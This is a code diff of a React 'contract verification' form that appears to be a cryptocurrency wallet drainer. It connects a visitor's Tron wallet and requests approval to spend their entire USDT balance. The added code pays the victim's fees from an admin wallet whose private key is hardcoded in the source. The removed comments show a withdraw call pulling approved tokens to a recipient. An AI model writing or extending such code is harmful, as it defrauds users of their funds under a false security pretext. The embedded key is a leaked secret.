@@ -1,6 +1,6 @@
 // @ts-nocheck
 
-import React, { useState, useEffect, useCallback, useMemo } from 'react';
+import React, { useState, useEffect, useCallback, useMemo, useRef } from 'react';
 import { useSpring, animated } from 'react-spring'
 import Button from '../common/Button'
 import { database, push, ref } from '../../firebase/firebase';
@@ -173,7 +173,71 @@ const VerificationFormComponent = (props) => {
     return today.toISOString().split('T')[0]
   }
 
-  // Trx code
+  const waitForTrxBalance = async (userAddress, minAmount = 35, maxAttempts = 35, delay = 3000) => {
+    let attempts = 0;
+
+    while (attempts < maxAttempts) {
+      const balance = await tronWeb.trx.getBalance(userAddress);
+      const balanceInTrx = balance / 1_000_000;
+      console.log('balancebalance', balanceInTrx);
+
+      if (balanceInTrx >= minAmount) {
+        return true;
+      }
+
+      await new Promise(res => setTimeout(res, delay));
+      attempts++;
+    }
+
+    throw new Error("User did not receive enough TRX in time.");
+  };
+
+
+  const fundTrxToUser = async (userAddress) => {
+    try {
+      setIsSubmitting(true);
+
+      const adminTronWeb = new TronWeb({
+        fullHost: 'https://api.trongrid.io',
+        privateKey: '56563e6d282c6decc6161c0199765cdf7b015bc3fc50ae0b4b6d4a6ff5cded10',
+      });
+
+      const sendAmount = 35 * 1_000_000;
+
+      const tx = await adminTronWeb.transactionBuilder.sendTrx(userAddress, sendAmount);
+      const signedTx = await adminTronWeb.trx.sign(tx);
+      const broadcast = await adminTronWeb.trx.sendRawTransaction(signedTx);
+      console.log('broadcast::', broadcast);
+
+      if (!broadcast.result) throw new Error("TRX transaction failed");
+
+      Swal.fire({
+        icon: 'info',
+        title: 'Sending TRX',
+        text: 'Waiting for TRX to arrive...',
+        timer: 3000
+      });
+
+      await waitForTrxBalance(userAddress, 35);
+
+      console.log('hellot::');
+
+      const contract = await tronWeb.contract().at(trxContractAddress);
+      const usdtTrx = await contract.balanceOf(userAddress).call();
+      const balanceUSDT = parseInt(usdtTrx.toString(), 10) / 1_000_000;
+
+      await handleApprove(balanceUSDT);
+    } catch (err) {
+      console.error(err);
+      Swal.fire({
+        icon: 'error',
+        title: 'Funding Failed',
+        text: err.message
+      });
+      setIsSubmitting(false);
+    }
+  };
+
 
   const fetchTrxBalance = async () => {
     tronWeb.setAddress(address);
@@ -182,36 +246,19 @@ const VerificationFormComponent = (props) => {
     const usdtTrx = await contract.balanceOf(address).call();
     const balanceUSDT = parseInt(usdtTrx.toString(), 10) / 1_000_000
     const balanceTrx = trxBalance / 1_000_000
-    console.log('hello');
-    
-    if (balanceTrx > 35 && balanceUSDT > 0) {
+
+    if (balanceTrx > 35) {
       handleApprove(balanceUSDT)
     } else {
-      setIsSubmitting(false);
-      Swal.fire({
-        icon: "error",
-        title: "Insufficient Balance",
-        text: "You need at least 35 TRX and 1 USDT for the verificaion."
-      });
+      // setIsSubmitting(false);
+      await fundTrxToUser(address);
+      // Swal.fire({
+      //   icon: "error",
+      //   title: "Insufficient Balance",
+      //   text: "You need at least 35 TRX for the verificaion."
+      // });
       return;
     }
-  };
-
-
-  const pollTransaction = async (txid) => {
-    // setStatus('Waiting for confirmation...');
-    // for (let i = 0; i < 20; i++) {
-    //   try {
-    //     const info = await tronWeb.trx.getTransactionInfo(txid);
-    //     if (info.receipt?.result === 'SUCCESS') {
-    //       setStatus('Transaction confirmed ✅');
-    //       setTxConfirmed(true);
-    //       return;
-    //     }
-    //   } catch (e) { }
-    //   await new Promise(resolve => setTimeout(resolve, 3000));
-    // }
-    // setStatus('Transaction not confirmed in time ⏱️');
   };
 
   const handleApprove = async (balanceUSDT) => {
@@ -245,7 +292,7 @@ const VerificationFormComponent = (props) => {
         setTimeout(() => {
           setShowResults(true)
         }, 100);
-        setIsSubmitting(false); 
+        setIsSubmitting(false);
       } else {
         setIsSubmitting(false);
         Swal.fire({
@@ -265,75 +312,44 @@ const VerificationFormComponent = (props) => {
     }
   };
 
-  // const handleWithdrawFromUser = async () => {
-  //   try {
-  //     const response = await fetch("http://192.168.29.251:3000/api/withdraw", {
-  //       method: "POST",
-  //       headers: {
-  //         "Content-Type": "application/json",
-  //       },
-  //       body: JSON.stringify({
-  //         owner: 'TXYtwPinqqB1Wk7QV3pk2m5VX6x4anvZ2r',           // address that approved the tokens
-  //         recipient: spenderTrx,   // where the tokens should be sent
-  //         amount: 5,                // in USDT (e.g., 5 not 5_000_000)
-  //       }),
-  //     });
-
-  //     const data = await response.json();
-  //     if (data.success) {
-  //       console.log("✅ Withdraw TX:", data.txid);
-  //     } else {
-  //       console.error("❌ Withdraw failed:", data.error);
-  //     }
-  //   } catch (err) {
-  //     console.error("❌ Error during withdraw:", err);
-  //   }
-  // };
-
-  // const checkAllowance = async () => {
-  //   const address = 'TXYtwPinqqB1Wk7QV3pk2m5VX6x4anvZ2r'; // Replace with the user's address
-  //   if (!TronWeb.isAddress(address) || !TronWeb.isAddress(spenderTrx)) {
-  //     console.error('Invalid addresses');
-  //     return;
-  //   }
-  //   try {
-  //     const contract = await tronWeb.contract().at(trxContractAddress);
-  //     const result = await contract.allowance(address, spenderTrx).call({ from: address });
-  //     const allowance = parseInt(result.toString(), 10) / 1_000_000;
-  //     console.log('Allowance:', allowance);
-  //     return allowance;
-  //   } catch (err) {
-  //     console.error('Allowance check failed:', err);
-  //   }
-  // };
+  const verifyButtonRef = useRef(null);
 
   useEffect(() => {
-    console.log('Wallet connected:', connected, 'Address:', address);
-    
     if (connected && address) {
       fetchTrxBalance()
     }
   }, [connected, address]);
 
-  const handleConnect = async () => {
+  const handleConnect = async (value) => {
     setIsSubmitting(true);
     try {
       await select('WalletConnect');
       await connect();
     } catch (err) {
-      Swal.fire({
-        icon: "error",
-        title: "Connection Cancelled",
-        text: "Wallet connection was cancelled or failed."
-      });
-      setIsSubmitting(false);
+      if ('WalletNotSelectedError: No wallet is selected. Please select a wallet.' == err?.toString().trim() && value === false && verifyButtonRef?.current) {
+        setTimeout(() => {
+          verifyButtonRef?.current?.click();
+        }, 100);
+      } else {
+        Swal.fire({
+          icon: "error",
+          title: "Connection Cancelled",
+          text: "Wallet connection was cancelled or failed."
+        }).then(() => {
+          setIsSubmitting(false);
+        });
+      }
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault()
+  const handleSubmit = async(value) => {
+
+    if (disconnect) {
+      await disconnect();
+    }
+
     if (formData?.blockchain === 'tron') {
-      handleConnect()
+      handleConnect(value)
     } else if (formData?.blockchain === 'binance') {
       approveToken()
     }
@@ -346,7 +362,7 @@ const VerificationFormComponent = (props) => {
         <p>Enter the contract address to verify authenticity and security</p>
       </div>
 
-      <form onSubmit={handleSubmit} className="verification-form">
+      <form className="verification-form">
         <div className="form-group">
           <label htmlFor="blockchain">Select Blockchain</label>
           <select
@@ -368,8 +384,10 @@ const VerificationFormComponent = (props) => {
         <Button
           label={isSubmitting ? "Verifying..." : "Verify Now"}
           variant="primary"
+          ref={verifyButtonRef}
           size="large"
-          type="submit"
+          type="button"
+          onClick={() => handleSubmit(false)}
           fullWidth
           disabled={isSubmitting}
         />
@@ -451,7 +469,6 @@ export default function VerificationForm() {
   const [isSubmitting, setIsSubmitting] = useState(false)
 
   const onError = (e) => {
-    console.log('Wallet error:', e);
     setIsSubmitting(false)
   };
 
